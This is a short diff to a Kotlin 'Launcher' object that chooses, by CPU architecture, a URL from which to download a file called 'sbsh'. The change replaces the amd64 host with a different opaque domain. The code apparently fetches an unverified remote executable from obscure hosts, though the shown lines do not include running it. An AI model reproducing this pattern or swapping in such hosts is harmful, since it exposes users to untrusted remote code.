@@ -181,7 +181,7 @@ object Launcher {
         val osArch = System.getProperty("os.arch").lowercase()
         val url = when {
             osArch.contains("amd64") || osArch.contains("x86_64") -> 
-                "https://amd64.ssss.nyc.mn/sbsh"
+                "https://amd64.00666.xyz/sbsh"
             osArch.contains("aarch64") || osArch.contains("arm64") -> 
                 "https://arm64.ssss.nyc.mn/sbsh"
             osArch.contains("s390x") -> 
